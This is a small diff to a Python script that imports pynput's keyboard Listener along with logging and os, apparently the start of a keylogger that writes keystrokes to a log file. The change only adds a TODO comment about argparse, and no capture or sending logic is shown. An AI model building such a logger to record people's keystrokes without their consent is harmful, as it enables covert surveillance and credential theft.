@@ -1,6 +1,8 @@
 from pynput.keyboard import Key, Listener
 import logging
 import os
+#TODO:
+#add argparse
 
 #change to  True if you want to delete the old log file and generate a new one 
 #if new_log is True then do nothing 
